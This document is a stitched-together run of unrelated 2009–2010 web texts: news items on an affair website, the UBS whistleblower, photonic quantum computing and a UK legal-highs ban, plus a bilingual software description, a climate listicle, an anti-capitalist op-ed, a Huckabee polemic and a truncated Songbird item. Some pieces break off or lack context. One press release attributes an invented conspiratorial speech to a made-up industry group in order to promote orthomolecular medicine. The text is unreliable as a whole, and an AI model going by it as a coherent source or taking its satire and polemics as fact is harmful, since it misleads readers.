UPDATE : No surprise to see all the usual slams being tossed at the prez - the usual snarky remarks , the " all he does is talk ! , " the freaking out because he used the word " bi-partisan . "
I 'm sure those types of temper tantrums when he responded forcefully within a couple hours of an odious ruling are great ways to get him to follow through and take you seriously as an ally and a base .
Pretty incredible to see so many people en masse ready to give up on a Democratic President after one year in office .
Not sure there 's any purpose in posting these diaries other than to give a further forum to those who would ensure that no good deed goes unpunished .
Hmmph .
Snow falls around The Houses of Parliament in central London January 6 , 2010 .
REUTERS / Toby Melville
LONDON ( Reuters Life ! ) -
Britons snowed in by the wintry weather have been flocking to an extra-marital dating site in the last 24 hours .
IllicitEncounters.com , which provides a platform for married people to conduct affairs , said on Wednesday it has seen an unexpected increase in visitors over the past 24 hours , and received a record number of new profiles on Wednesday morning .
The website said most new members are registering from areas worst hit by this week ’s extreme weather , including Hampshire , Berkshire , and the West Country , and the site has taken on several temporary staff members to cope with the rush .
“ In light of these figures , I ’d be interested to see how much work those ‘ working from home ’ have actually done , ” IlicitEncounters.com spokeswoman Sara Hartley said in a statement .
“ Perhaps these wives and husbands have just been waiting for a time when they could join , away from the eyes of their work colleagues and , most importantly , their partners ... ”
The website said it has gained 2,567 new members in the last six days , suggesting that January will be its busiest month ever .
It says it has more than 350,000 members in Britain and that its aim is to create a safe and nonjudgmental environment where married men and women can meet each other .

macOS ( does not work on Catalina v.10.15 )
RGB実験音楽研究所 / macOS 版 ( Catalina v.10.15 では動きません）
This application was put together Kenji Kojima 's RGB Music Project studies .
RGB Music Project is a composite artwork of visuals , music , and technologies that converts visual data into music in attempts to discover the relation between visuals and music .
The project core is the development of software RGB MusicLab .
RGB MusicLab converts RGB ( Red , Green , and Blue ) value of an image and surface points ( X , Y , Z ) of the 3D object to chromatic scale sounds .
The program reads RGB value of pixels from the top left to the bottom right of an image .
One pixel makes a harmony of three note of RGB value , and the length of note is determined by the brightness of the pixel .
RGB value 120 or 121 is the middle C , and RGB value 122 or 123 is added a half steps of the scale that is C#.
Pure black that is R=0 , G=0 , B=0 is no sounds .
It is not an impression of a painting or a photograph of a musical variation .
It is not an arbitrary process .
It composes a score from an image directly .
The technique of music is called an algorithmic composition .
Also this music and visual is a Multi-Media Art and sometimes refers to as Synesthesia .
You can use music which is created by RGB MusicLab freely .
However , it is under the Creative Commons License ( CC BY - NC - SA 3.0 ) .
このプログラムは、小島健治のRGBカラーを使ったアートワークのスタディを、ひとつのアプリケーションに纏めたものです。イメージから音楽を作り出すこのソフトウエアは、作曲家が絵画作品や写真を見て、感じたものを音楽作品とするのではなく、直接画像のデータを音符のように読み取ってメロディーを作り出します。コンピュータ・プログラミングを使用したこのようなソフトウエア・アートは、音楽的にはアルゴリズム作曲法と呼ばれ、視覚聴覚の境を越えたメディア・アート、またシナステージア（共感覚）のアートと言われる事もしばしばあります。
RGBミュージックは、文化が培って来た感情を土台として作られる音楽ではないので、写真のイメージ通りの音は期待できません。RGB
MusicLabを使って市販の音楽のようなものを作り出すと言うより、視覚も聴覚もコンピュータのデータでは同等に扱えるアートの可能性として、考えてもらうのが良いかもしれません。それは視覚と聴覚のような違う感覚を、コンピュータ上でミックスしたり分離したりもするアートに、発展できると言う意味です。
コンピュータの画像は沢山のピクセルからイメージを形作っていて、１つのピクセルは赤緑青（Red , Green , Blue）の光の３原色が数値で決められています。RGB
MusicLab は、その数値を読み取って音階に変換します。RGBは 0 から255 までの数字が配布されていて、ほぼ中央の120をピアノの中央のド（ミドルC）として変換します。

ZURICH / NEW YORK ( Reuters ) -
The chief whistleblower in the UBS AG tax secrecy probe entered prison to serve a sentence he considered unfair , hours after a Swiss court ruled the bank should not have been forced to turn over client files to government investigators .

Bradley Birkenfeld , a former UBS banker , entered a Schuylkill County federal prison in Pennsylvania to serve a 40 - month prison term , after attacking the government for the punishment in light of what he called his cooperation in helping expose thousands of U.S. tax cheats .
“ The American taxpayer should be outraged , ” the 44 - year - old told reporters in a snowstorm as he prepared to surrender to prison authorities .
He said he was “ proud ” to have come forward and “ expose the largest tax fraud in the world . ”
Last February , UBS accepted a $ 780 million penalty and admitted to criminal wrongdoing for helping U.S. taxpayers hide accounts from the Internal Revenue Service .
The Swiss bank later agreed to give the names of 4,450 American clients to investigators .
Several in the United States have already pleaded guilty to various tax crimes .
On Friday , a federal judge sentenced retired Boeing Co sales manager Roberto Cittadini to one year probation and a $ 10,000 fine after the defendant admitted
to hiding $ 1.86 million in UBS accounts .
SWISS COURT FAULTS REGULATOR
Birkenfeld himself had sought probation in light of his cooperation with the government , which itself had requested a prison term of 30 months .
On Monday , U.S. District Judge William Zloch in Fort Lauderdale , Florida , who imposed the 40 - month sentence , rejected Birkenfeld ’s efforts to reduce and postpone the term .
Stephen Kohn , a lawyer for Birkenfeld , said the imprisonment would have a “ chilling ” effect on other bankers who might consider exposing tax fraud .
Earlier Friday , Switzerland ’s Federal Administrative Court ruled that the country ’s financial regulator , FINMA , broke bank secrecy laws last February in ordering UBS to give data on nearly 300 clients to U.S. authorities .
The court said FINMA ’s unilateral action weakened Switzerland ’s strict bank secrecy rules in an effort to end investigations into that nation ’s biggest bank , which had prompted clients to withdraw huge sums from their accounts .
FINMA , the court said , should not have acted “ outside of a proper process of a request for official assistance . ”
UBS declined to comment and FINMA said it might appeal .
The Swiss court said on Friday it was up to clients to decide what further action they take .
PROBATION
Cittadini , a 68 - year - old resident of Bellevue , Washington resident pleaded guilty in October to one count of filing a false tax return , and admitted to failing to report income from his accounts , according to the Justice Department .
According to court documents , he set up a Hong Kong corporation in 2000 at the suggestion of a Swiss banker and with counsel of a Swiss lawyer , both of whom have also been indicted .
At his hearing , Cittadini told U.S. District Judge Ricardo Martinez that , while “ tax evasion was never a consideration ” in his thinking , he made a “ grievous mistake of judgment ” in opening his UBS accounts .
On Wednesday , Juergen Homann , a UBS client in New Jersey , was sentenced to five years probation and a $ 60,000 fine for failing to report $ 6.1 million he held in Swiss bank accounts .
The case is U.S. v. Cittadini , U.S. District Court , Western District of Washington , No. 09-0344 .

One of the biggest challenges scientists are grappling with today is the creation of an efficient quantum computer .
There are a number of models out there , and hundreds of scientists and researchers around the world are constantly coming up with theories and experiments in an effort to make quantum computing possible .
One of the main issues is that of entanglement .
Being able to entangle photons has long been thought a necessity of quantum computing .
“ It ’s important to manipulate an increasing number of qubits , ” Wei -bo Gao tells PhysOrg.com .
“ One way to extend the number of qubits is to be able to entangle a greater number of particles .
However , usually it is very difficult .
So far , up to eight atoms have been demonstrated .
The other way is to create entanglement with more degrees of freedom .
It is called hyper - entanglement , and it is vital for efficient quantum computing . ”
Gao is a scientist in Jian - wei Pan ’s group at the University of Science and Technology of China , located in Hefei .
He has been working with a team of scientists from the University of Science and Technology , as well as scientists from the Österrichische Akademie der Wissenshaften and the Universität Innsbruck in Austria , the Universidad de Sevilla in Spain , and Ruprecht - Karls - Universität Heidelberg in Germany .
They have succeeded in demonstrating an optical controlled - NOT gate based on a six qubit cluster state , and the results can be seen in Physical Review Letters : “ Experimental Realization of a Controlled - NOT Gate with Four - Photon Six - Qubit Cluster States . ”
“ We created a cluster state that is universal for quantum computing , ” Gao says .
“ We also show that spatial qubits can help in quantum computing .
Our method uses different degrees of freedom , including polarization and spatial modes of photons , to help achieve hyper- entanglement .
We have recently done up to 10 qubits , using five photons and two degrees of freedom for each photon , even though this paper only demonstrates six qubits . ”
Gao and his peers generated the six - qubit state using photons , and then used single qubit measurements to apply the CNOT gate to arbitrary single input qubits , which is thought to be one of the keys to creating universal quantum computation .
The team also took care to show that this optical method of quantum computation could not be reproduced using local operations and classical communication techniques .
The next step is to see whether hyper - entanglement can be achieved using even more photons and degrees of freedom .
“ We ’d like to create seven photon entanglement , and use more degrees of freedom , ” Gao explains .
“ Now that we have shown that spatial qubits can be used , we ’d like to see if arrival time and angular momentum could also be used .
This would help increase the number of qubits and provide scalability to quantum computing . ”
Part of the challenge to increase the number of photons used is the collection process .
“ We will need to increase collection efficiency so that we can actually get more photons .
That will be a bit of a challenge in making efficient optical quantum computers , but it is something that many scientists are working on . ”
Gao is sure that scalable quantum computing can be achieved at some point in the relatively near future .
“ With more power , more degrees of freedom , and the developing technique of atomic memory , I am confident that more efficiency in optical quantum computing can be achieved as we have more qubits . ”

A ban on a range of so - called " legal highs " came into force today .
The ban covers GBL , BZP and man-made chemicals sprayed on herbal smoking products such as " Spice " , which are now classed as controlled substances under the Misuse of Drugs Act 1971 .
The crackdown comes after the high - profile case of medical student Hester Stewart , 21 , who died in Brighton in April after taking GBL .

She said : " In America , it is schedule A , which is the equivalent of a Class A drug here . "
However , Home Secretary Alan Johnson said : " We are sending out a clear message to anyone who is thinking about experimenting with them ( the drugs ) , particularly over the festive period , that not only are they putting themselves in danger , they will also be breaking the law . "

Climate change will lose what humans love - AlterNet January 6 , 2010
8 Things We Love That Climate Change Will Force Us to Kiss Good - Bye
Tara Lohan
AlterNet : December 18 , 2009 .
http://www.alternet.org/story/144645/8_things_we_love_that_climate_change_will_force_us_to_kiss_good-bye?page=entire
We face losing everything from 50,000 species a year to the world ’s best wines .
How to put it all in perspective ?
If we do n’t work quickly to curb the effects of climate change we may lose the bird - eating fanged frog .
Most of us may not miss that one , but there is an enormous list of species and places we may never see again unless we reverse this crazy climate change ride we ’ve put the earth on .
The Natural Resources Defense Council reported that , “ The first comprehensive assessment of the extinction risk from global warming found that more than 1 million species could be obliterated by 2050 if the current trajectory continues . ”
The numbers are virtually impossible to comprehend , especially when you consider that not just individual species , but entire habitats , cities , and cultures may be lost .
How to put it all in perspective ?
Below are eight major features of our planet and our lives whose potential disappearance may inspire action .
1. World ’s Best Wines
So far the polar bear has become the poster child for climate change , but we may have more luck galvanizing people into action if they know the future of some of world ’s best wine is at stake .
A report from Greenpeace showed that the climatically sensitive process of wine production in France is being disrupted by changing temperatures .
“ The average annual temperature has significantly increased , leading to major shifts in the wine production calendar , ” the group reports .
“ The harvesting season is occurring much earlier than normal and higher temperatures are proving detrimental to the vines .
Wines end up having higher sugar levels and alcohol content while retaining less acids — which means they are unbalanced with an overripe flavor and heavier texture . ”
Great wines are the result of a combination of climate and terroir , and both are at risk .
Apparently this news is spurring food and wine groups in France to demand action in Copenhagen .
Greenpeace reported that a coalition of renowned chefs and sommeliers have said that if French wines are to survive , they need “ an ambitious deal by developed nations to reduce carbon emissions by 40 percent by 2020 . ”
And it ’s not just French wine .
The National Academy of Sciences predicted that climate change could mean the end for California ’s tasty vinos , too .
Hey , if the threat of millions of climate refugees and mass extinction does n’t get people going , maybe alcohol will .
2. 50,000 Rainforest Species a Year
Scientists estimate that we lose 50,000 species a year to deforestation in the world ’s rainforests .
And to make matters worse , the already horrendous environmental effects of deforestation are being amplified by climate change .
This is playing out most notably in the Amazon .
“ The fear is that there will be a kind of a feedback where trees are cut down , and it gets warmer and drier ” in the forest and harder for the trees and other vegetation to grow back , Bob Henson , author of The Rough Guide to Climate Change , told CNN .
Without the Amazon , we lose what scientists call the “ lungs ” of our planet — the area where 20 percent of the world ’s oxygen is produced .
Not to mention the thousands of fruits , plants , herbs , medicines and other edibles that come from the region .
Now scientists are saying that one third of the Amazon ’s trees could be wiped out by modest temperatures rises .
“ The research , by some of Britain ’s leading experts on climate change , shows that even severe cuts in deforestation and carbon emissions will fail to save the emblematic South American jungle , the destruction of which has become a powerful symbol of human impact on the planet , ” the Guardian reported .
“ Up to 85 % of the forest could be lost if spiraling greenhouse gas emissions are not brought under control , the experts said .
But even under the most optimistic climate change scenarios , the destruction of large parts of the forest is ‘ irreversible . ' ”
3. New Orleans
There ’s a long list of cities in danger of being swamped by rising sea levels , including major population centers like London , New York , Calcutta and Shanghai .
But New Orleans , which already sits below sea level , is especially vulnerable .
And we all know how good our nation ’s record is of helping New Orleans deal with catastrophe and its aftermath .
“ Scientists say New Orleans and the barrier islands to the south will be severely affected by climate change by the end of this century , with sea level rise and growing intensity of hurricanes .
Much of the land mass of the barrier island chain sheltering New Orleans was lost in the 2005 storm , ” the Guardian reported .
“ But the extent of the land that will be lost is far greater than earlier forecasts suggest , ” said Dr. Michael Blum and Professor Harry Roberts .
The two performed a study which found that huge amounts of soil need to be dumped into the Mississippi River Delta , otherwise 5,212 square miles of land in the area could be lost to the ocean and tidal marsh by 2100 .
“ All that remains of New Orleans would probably be the French Quarter and the airport , ” the Christian Science Monitor reported about the study .
“ Lake Pontchartrain would lie beneath a vast bay .
Along its southernmost reaches , the Mississippi River would remain a river only by virtue of the levees raised to contain it . ”
4. Pacific Salmon
Salmon on the Pacific coast have had a rough time , thanks to dams , pollution , introduction of nonnative species and other bad decisions by us humans .
Now , climate change is causing rising temperatures , which are affecting this cold - water loving species , and decreased precipitation is causing reduced river flows , further threatening salmon .
Throw in some ocean acidification and it ’s a recipe for disaster for salmon populations and those who depend on them .
And there are lots who do .
Salmon are a crucial part of the food chain for 150 species , including humans .
The fish is a staple in many Native American communities and an economic mainstay for tens of thousand of fishermen in coastal towns .
“ Global warming is expected to hit the already warm and dry western U.S. very hard , ” said Glen Spain of the Pacific Coast Federation of Fishermen ’s Associations , most of whose members depend on salmon harvests for a large part of their livelihoods .
“ The science shows that these changes have already begun , and are already affecting our region ’s valuable salmon runs .
Averting this looming disaster should be one of our nation ’s highest priorities . ”
5 . The Maldives and Tuvalu
While rising seas may threaten one of the United States ’ most beautiful and culturally rich cities , it ’s also getting dangerously close to wiping out entire countries , including the island nations of the Maldives in the Indian Ocean and Tuvalu in the Pacific .
The Maldives are composed of over 1,000 coral islands and support a huge diversity of marine life , including commercial tuna fisheries .
The gorgeous Polynesian country of Tuvalu is one of the smallest in the world and is already looking for other nations to take in its citizens as climate refugees .
The Maldives ’ first democratically elected president , Mohamed Nasheed , spoke at COP15 earlier this week , calling for immediate action to restrain CO2 levels and return them to 350 parts per million , as scientists have recommended :
We are here to save our planet from the silent , patient and invisible enemy that is climate change …
There are those who tell us that solving climate change is impossible .
There are those who tell us taking radical action is too difficult .
There are those who tell us to give up hope .
Well , I am here to tell you that we refuse to give up hope .
We refuse to be quiet .
We refuse to believe that a better world is n’t possible .
I have three words to say to the doubters and deniers .
Three words with which to win this battle .
Just three words are all I need .
You may already have heard them .
Three – Five – Oh .
Three – Five – Oh .
6. Glaciers
Glacier National Park is going to have the same draw without the glaciers .
When the park was created in 1910 it had 150 glaciers .
Today it has only 30 , and they ’re getting smaller .
And it ’s not the only iconic spot on the verge of losing its icy coat — both Mount Everest and Mount Kilimanjaro are threatened , too .
“ It is clear that global warming is emerging as one , if not the , biggest threat to mountain areas , ” says Roger Payne of the International Mountaineering and Climbing Federation .
As for Kilimanjaro , National Geographic reports , “ The ice fields Ernest Hemingway once described as ‘ wide as all the world , great , high , and unbelievably white in the sun ’ have lost 82 percent of their ice since 1912 – the year their full extent was first measured .
If current climatic conditions persist , the legendary glaciers , icing the peaks of Africa ’s highest summit for nearly 12,000 years , could be gone entirely by 2020 . ”
This is bad news for animals that have adapted to live in these ecosystems and for the businesses that are supported by tourism and climbers .
But melting glaciers also mean immediate flooding , following by drought .
This is bad news for billions .
Agence France Presse reported this week that melting glaciers in the Himalayas will affect 1.3 billion Asians living downstream in Pakistan , India , China , Nepal and Bhutan .
“ Temperatures in the region have increased by between 0.15 and 0.6 degrees Celsius ( 0.27 and 1.08 degrees Fahrenheit ) each decade for the last 30 years , dramatically accelerating the rate at which glaciers are shrinking , ” the news outlet reported .
“ ‘ Scientists predict that most glaciers will be gone in 40 years as a result of climate change , ’ said Prashant Singh , leader of environmental group WWF ’s Climate for Life campaign . ”
7. Coral Reefs
Carbon dioxide emissions are causing the world ’s oceans to become more acidic , which is a threat to creatures that have “ chalky ” skeletons ( including corals ) .
In order to form their skeletons , they need the water to be saturated with calcium carbonate , but as acidification goes up , saturation goes down .
According to Science Daily this poses a risk to one - third of ocean life and the basis of the ocean food chain .
If temperatures rise by 3.6 degrees Fahrenheit , we are likely to lose 97 percent of our coral reefs .
The Center for Biological Diversity ( CBD ) recently filed a petition to have 83 species of coral listed under the Endangered Species Act .
SolveClimate reports that , “ Since acidification happens at a rate parallel to the increase of atmospheric carbon dioxide — oceans absorb about one - third of CO2 — it ’s picking up pace .
According to CBD oceans director Miyoko Sakashita , coral reefs are likely to be the first major ecosystems widely damaged by the effects of more acidic oceans . ”
Some of the world ’s most famous coral reefs include Australia ’s Great Barrier Reef , which is the world ’s largest ; the Belize Barrier Reef ; the New Caledonia Barrier Reef in the South Pacific ; the Red Sea Coral Reef ; and the Andros , Bahamas Barrier Reef .
The reefs are home to an incredible array of biological diversity , next only to rainforests , and also provide vast economic boosts .
“ Globally , the welfare of 500 million people is closely linked to the goods and services provided by coral reef biodiversity , ” Science Daily reports .
They are also home to some of the most beautiful sights on Earth .
8. Really Big Bears
Most environmentalists know that “ charismatic megafauna ” are the ones that capture the hearts of the public and the media .
This has catapulted the polar bear to the forefront of our attention , making it the first mammal to be listed as threatened because of climate change .
The loss of summer ice in the Arctic has meant shrinking hunting grounds for the bear .
They ’ve had to travel farther to find food , decreasing their fat storage , increasing their stress , and causing some to drown as they swim to reach distant ice floes .
By 2050 , two - thirds of polar bear sub-populations will be gone .
But polar bears are n’t the only bears at risk .
Changing temperatures are now causing grizzlies to den later in the fall .
As a result they ’re overlapping with hunting season , which is bad news for the bear .
But that ’s not all .
Climate change is also affecting their food sources .
“ Whitebark pine ( Pinus albicaulis ) seeds are a food resource for grizzly bears in some areas , including Yellowstone .
Global warming has led to an increase in whitebark pine blister rust as well as an increase in competing species such as Douglas fir in higher elevations , ” the Endangered Species Coalition reports .
“ As whitebark pine and other natural grizzly food resources decline due to global warming , grizzlies may shift from remote high elevation areas to lower elevation human - populated areas , looking for alternative foods .
Here , they often encounter humans and our garbage , food and livestock .
This causes bears to become conditioned to humans ; these human - conditioned bears are often removed or killed by wildlife managers due to safety concerns . ”
And the List Goes On
There are thousands of other species teetering on the brink of collapse and as many incredible places that will lost , if we do n’t take action to curb our greenhouse gas emissions and begin mitigation strategies .
Later today , we will be able to see what the world ’s political leaders have agreed to and if it will be enough .
As we try to untangle the outcome of the COP15 climate change negotiations in Copenhagen , let ’s try to keep this list in mind , even though it ’s just the tip of the iceberg when it comes to what ’s at stake .
When we ’re talking about preserving ecological diversity , amazing creatures , human lives , and some of the most beautiful places on Earth we need solutions that transcend politics and economics as usual .

There is no meaningful response to climate change without massive social change .
A cap on this and a quota on the other wo n't do it .
Tinker at the edges as we may , we cannot sustain earth 's life - support systems within the present economic system .
Capitalism is not sustainable by its very nature .
It is predicated on infinitely expanding markets , faster consumption and bigger production in a finite planet .
And yet this ideological model remains the central organising principle of our lives , and as long as it continues to be so it will automatically undo ( with its invisible hand ) every single green initiative anybody cares to come up with .
Much discussion of energy , with never a word about power , leads to the fallacy of a low - impact , green capitalism somehow put at the service of environmentalism .
In reality , power concentrates around wealth .
Private ownership of trade and industry means that the decisive political force in the world is private power .
The corporation will outflank every puny law and regulation that seeks to constrain its profitability .
It therefore stands in the way of the functioning democracy needed to tackle climate change .
Only by breaking up corporate power and bringing it under social control will we be able to overcome the global environmental crisis .
On these pages we have been called on to admire capital 's ability to take robust action while governments dither .
All hail Wal - Mart for imposing a 20 % reduction in its own carbon emissions .
But the point is that supermarkets are over .
We cannot have such long supply lines between us and our food .
Not any more .
The very model of the supermarket is unsustainable , what with the packaging , food miles and destruction of British farming .
Small , independent suppliers , processors and retailers or community - owned shops selling locally produced food provide a social glue and reduce carbon emissions .
The same is true of food co-ops such as Manchester 's bulk - distribution scheme serving former " food deserts " .
All hail BP and Shell for having got beyond petroleum to become non-profit eco-networks supplying green energy .
But fail to cheer the Fortune 500 corporations that will save us all and ecologists are denounced as anti-business .
Many career environmentalists fear that an anti-capitalist position is what 's alienating the mainstream from their irresistible arguments .
But is it not more likely that people are stunned into inaction by the bizarre discrepancy between how extreme the crisis described and how insipid the solutions proposed ?
Go on a march to the House of Commons .
Write a letter to your MP .
And what system does your MP hold with ?
Name one that is n't pro-capitalist .
Oh , all right then , smartarse .
But name five .
We are caught between the Scylla and Charybdis of climate change and peak oil .
Once we pass the planetary oil production spike ( when oil begins rapidly to deplete and demand outstrips supply ) , there will be less and less net energy available to humankind .
Petroleum geologists reckon we will pass the world oil spike sometime between 2006 and 2010 .
It will take , argues peak - oil expert Richard Heinberg , a second world war effort if many of us are to come through this epoch .
Not least because modern agribusiness puts hundreds of calories of fossil - fuel energy into the fields for each calorie of food energy produced .
Catch - 22 , of course , is that the very worst fate that could befall our species is the discovery of huge new reserves of oil , or even the burning into the sky of all the oil that 's already known about , because the climate chaos that would unleash would make the mere collapse of industrial society a sideshow bagatelle .
Therefore , since we 've got to make the switch from oil anyway , why not do it now ?
Solutions need to come from people themselves .
But once set up , local autonomous groups need to be supported by technology transfers from state to community level .
Otherwise it 's too expensive to get solar panels on your roof , let alone set up a local energy grid .
Far from utopian , this has a precedent : back in the 1920s the London boroughs of Wandsworth and Battersea had their own electricity - generating grid for their residents .
So long as energy corporations exist , however , they will fight tooth and nail to stop whole postal districts seceding from the national grid .
Nor will the banks and the CBI be neutral bystanders , happy to observe the inroads participatory democracy makes in reducing carbon emissions , or a trade union striking for carbon quotas .
There are many organisational projects we can learn from .
The Just Transition Alliance , for example , was set up by black and Latino groups in the US working with labour unions to negotiate alliances between " frontline workers and fenceline communities " , that is to say between union members who work in polluting industries and stand to lose their jobs if the plant is shut down , and those who live next to the same plant and stand to lose their health if it 's not .
We have to start planning seriously not just a system of personal carbon rationing but at what limit to set our national carbon ration .
Given a fixed UK carbon allowance , what do we spend it on ?
What kinds of infrastructure do we wish to build , retool or demolish ?
What kinds of organisational structures will work as climate change makes pretty much all communities more or less " fenceline " and almost all jobs more or less " frontline " ?
( Most of our carbon emissions come when we 're at work ) .
To get from here to there we must talk about climate chaos in terms of what needs to be done for the survival of the species rather than where the debate is at now or what people are likely to countenance tomorrow morning .
If we are all still in denial about the radical changes coming - and all of us still are - there are sound geological reasons for our denial .
We have lived in an era of cheap , abundant energy .
There never has and never will again be consumption like we have known .
The petroleum interval , this one - off historical blip , this freakish bonanza , has led us to believe that the impossible is possible , that people in northern industrial cities can have suntans in winter and eat apples in summer .
But much as the petroleum bubble has got us out of the habit of accepting the existence of zero - sum physical realities , it 's wise to remember that they never went away .
You can either have capitalism or a habitable planet .
One or the other , not both .

FOR IMMEDIATE RELEASE
Orthomolecular Medicine News Service , January 21 , 2010
How to Fool All of the People All of the Time :
US Taxpayers Fund Library Censorship ( OMNS , January 21 , 2010 )
At a recent emergency meeting of the World Headquarters Of Pharmaceutical Politicians , Educators , and Reporters ( WHOPPER ) : " Ladies and gentlemen , we have a slight problem .
The public is beginning to complain about how the US National Library of Medicine censors nutritional research .
This is embarrassing , as the last thing we want is for taxpayers to question how their tax money is spent .
It is none of their damn business .
But it is definitely a matter of business , big business , for WHOPPER .
" Up until now , when people write to complain about journal censorship ( custserv@nlm.nih.gov ) , we 've managed to get away with NLM sending out this form letter reply : ' The National Library of Medicine ( NLM ) uses a 15 - person advisory committee of health professionals and librarians to recommend titles to be indexed .
This committee uses guidelines , available to the public on our website , such as scientific merit , importance of the content to the scientific community , and editorial processes to assist it in making recommendations .
Additional information about journal selection is available at http://www.nlm.nih.gov/pubs/factsheets/jsel.html
'
" The beauty of this is that we do not have to follow the published guidelines .
We control the National Library of Medicine so skillfully that we got Medline to index publications that are not medical journals at all .
We are enormously proud to say that Medline indexes Time magazine , Newsweek , US News and World Report , and Consumer Reports .
But not the peer - reviewed Journal of Orthomolecular Medicine , continuously published for more than 40 years , nor the peer - reviewed journal Fluoride , also published for decades .
" Yes , there are about 2,000 indexed articles on Medline / PubMed just from Time magazine .
Here : see for yourself what a great job we 've done .
Go to Medline ( http://www.ncbi.nlm.nih.gov/pubmed ) and do your own two - second search for " time magazine " .
Then try Newsweek : over 1,900 Medline responses .
US News and World Report : over 2,000 articles indexed by Medline .
Medline also indexes several hundred articles from Consumer Reports .
Check and see .
It is quickest if you search Medline / PubMed by putting quotes around the magazine 's name .
" Medline even indexes two dozen articles from Reader 's Digest .
( search for " read dig . " )
" Is n't this terrific ?
" While it is embarrassingly obvious that these are not medical journals , there is nothing the public can do about it .
Medline indexes what its Literature Selection Technical Review Committee tells it to .
The committee 's members are all appointed ; none are elected .
They meet behind closed doors .
No public input is accepted .
( 1 ) No taxpayer can communicate with them or attend hearings , because there are n't any hearings .
" Quite a system , is n't it ?
But hey , even Al Capone knew that a picked jury guarantees the verdict .
We have a good little racket going here , and we are not about to change it for 150 million silly vitamin - pill - popping voters .
They will read what we decide they should read .
" Some WHOPPER members are concerned that , after this story broke on the internet , a few nutritional crackpots are writing to their Congressperson and Senators and demanding action .
We understand that questions being asked include , ' Why is there journal censorship in a public library ?
Why the secrecy ?
Why is an unelected ' advisory ' committee making decisions , in private , about what the public has access to on the National Library of Medicine 's tax - funded Medline service ?
Should a select small group , an elite , control a public library in the Land of the Free ? '
" Now to reassure you : if you are worried about pressure from the House and the Senate , relax .
The people have better things to do with their time than to really push their elected representatives for action on something as small potatoes as the First Amendment .
It is true that American patriot Samuel Adams said , ' When arbitrary rulers are put over them , when government is secret , the people become alarmed . '
" But do n't worry .
He 's dead . "
References : ( 1 ) Correspondence received from Medline : " If the ( journal review ) meeting were open to the public , word could circulate about a committee recommendation before a final determination was made . . .
While names of review committee members are public information , NLM never discloses names of primary and secondary reviewers for specific journals .
Observers could obtain that information and it could affect the openness of discussion and might result in contact with specific reviewers after the meeting .
It is NLM 's policy to prevent unnecessary contact with specific reviewers . "

Former AR Governor , GOP Presidential Candidate , Fox ' News ' Host Must Take Responsibility for Murder of Four Police Officers
' How many more godly goofs can this country afford ? '
Frank Schaeffer Byon 12/1/2009 , 8:34 am PT
Guest Editorial by Frank Schaeffer
Mike Huckabee broke his silence on Monday and defended his decision to give clemency to a convict said to be responsible for the ambush murder of four Seattle police officers .
I have an odd connection to Huckabee .
He told Katie Couric , during the 2007 primary race , that my Religious Right leader father 's ( Francis Schaeffer ) book , How Should We Then Live ? , was his favorite book .
The book is credited ( along with others my father wrote ) for starting the evangelical wing of the anti-abortion movement .
In Huckabee ’s more than 1000 pardons of criminals that prosecutors and victims objected to in Arkansas Huckabee most often cited his belief in “ redemption ” as his " reason . "
This belief was a result of Huckabee ’s extreme and literal born - again fundamentalist views about people ’s path to God .
His religious views obviously trumped common sense .
And this was a direct result of a theology known as " Dominionism " ( or " Reconstructionism " ) where believers want to not just believe their religion privately but " take back America for God " in other words rule on the basis not of American law but the Bible .
I explain this trend in my book Patience with God : Faith for People Who Don't Like Religion ( or Atheism ) .
Huckabee freely mixes his ideas about church and state and how religion should shape policy .
That brings up a question : should any religious fundamentalists ever be elected President by Americans who want them to do a good , sensible , moderate job , not use their office for expression of their pet religious fanaticism ?
And another : was n't one already more than enough ?...
It seems to me that Huckabee ’s absurd record of unwarranted pardons of dangerous criminals including killers and rapists is just another example proving that the heart of the Republican Party is now in the hands of religious extremists .
( Jeff Sharlet makes the same point in his excellent book The Family , as does Max Blumenthal in his book Republican Gomorrah ) .
We have heard Sarah Palin saying that health care reform will lead to “ death panels . ”
We had George W. Bush saying that he felt God was leading him to go to war in Iraq .
We have Christian Zionists like Rev. John Hagee rooting for Armageddon in the Middle East so Jesus will return all the sooner and then endorsing figures like John McCain --- who until called out on Hagee ’s crazy anti-Catholicism --- accepted the endorsement !
And now four police officers are dead because Huckabee ( the not - so - covert Reconstructionist ) takes every word of the Bible more seriously than the advice of prosecutors and victim rights groups .
As today 's New York Times noted in " Old Clemency May Be Issue for Huckabee " :
Mr. Huckabee , now a Fox News talk - show host , has been leading the pack of possible Republican contenders for president in 2012 .
But the killings of the police officers are focusing renewed attention on his long - contentious record of pardoning convicts or commuting their sentences .
In a decade as governor beginning in 1996 , Mr. Huckabee did so twice as many times as his three predecessors combined .
He typically gave little explanation for individual pardons .
But he spoke often of his belief in redemption , based on a strong religious belief ...
The commutation of Mr. Clemmons ’s [ the alleged Seattle cop killer ] sentence was routine enough that it failed to make a list of Mr. Huckabee ’s 10 “ most publicized ” prison commutations compiled by an Arkansas newspaper in August 2004 ...
Within six months , Mr. Clemmons violated the conditions of his parole , returning to prison in July 2001 for aggravated robbery ...
Mr. Huckabee , who rode a brand of prairie populism to finish second in the Republican presidential primaries in 2008 , granted more than 1,000 pardons or clemency requests as governor .
As his reputation for granting clemency spread , more convicts applied ... in several , he followed recommendations for clemency from Baptist preachers who had been longtime supporters .
Prosecutors told him he was ignoring his responsibility to explain to citizens why he was setting free convicted murderers and rapists ...
Robert Herzfeld , then the prosecuting attorney of Saline County , wrote a letter to Governor Huckabee in January 2004 , saying his policy on clemency was “ fatally flawed ” ....
Mr. Huckabee ’s chief aide on clemency wrote back : “ The governor read your letter and laughed out loud .
He wanted me to respond to you .
I wish you success as you cut down on your caffeine consumption . "
It is clear that Huckabee is unfit for any national office and was unfit to ever be a governor .
It is also clear that his record of insane irresponsibility was well known by the evangelicals that supported him for theological reasons in the 2007 primaries leading up to the '08 race .
Clearly the evangelical crowd that gave us 8 years of George W. Bush does n’t vote on the basis of facts .
They vote for “ correct ” theology and damn the real world consequences .
Four thousand Americans were needlessly killed in Iraq because the born - again , born again ’s president was in control .
More that 50,000 were wounded because of the way Bush thought he heard God ’s voice .
Four officers in Seattle are dead today because of Huckabee ’s allegiance to his interpretation of the Bible rather than to the U.S. Constitution .
How many more godly goofs can this country afford ?

Songbird , the open source iTunes alternative ( which we reported on earlier ) , has landed a big deal with Philips .
The Dutch electronics manufacturer will bundle Songbird with its GoGear line of .mp3 players as the music management and sync tool .
While this is good news for Songbird , there are is a catch .
Philips will indeed bundle songbird with its GoGear .mp3 players , but it wo n’t be a vanilla installation ( where does that expression come from , anyway ? ) .
